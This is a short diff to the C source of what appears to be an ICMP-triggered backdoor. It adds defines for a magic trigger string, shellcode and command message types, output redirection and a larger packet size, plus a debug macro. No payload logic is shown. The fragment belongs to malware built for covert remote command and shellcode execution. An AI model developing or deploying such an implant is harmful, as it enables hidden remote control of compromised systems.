@@ -10,15 +10,27 @@
 #include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
 #include <sys/mman.h>
+#include <bits/waitflags.h>
 
 #define DEBUG
 #define SIZE_ETHERNET   14
 #define STACK_SIZE      512
-#define MAX_PACKET_SIZE 128
+#define MAX_PACKET_SIZE 1024
+#define INTERFACE		"eth0"
 #define MAGIC           "GOATSE"
+#define REDIRECT		" 2>&1"
 
 #define MESSAGE_SHELLCODE 	0x01
 #define MESSAGE_COMMAND 	0x02
+
+#define SIG_IGN				1
+#define SIG_CHILD			17	
+
+#ifdef DEBUG
+#define DEBUG_WRAP(code) code
+#else
+#define DEBUG_WRAP(code)
+#endif
 
 // Build response packets for sending
 int build_packet(unsigned char *pkt, const struct icmphdr *icmp_input, uint8_t *data, uint32_t size);
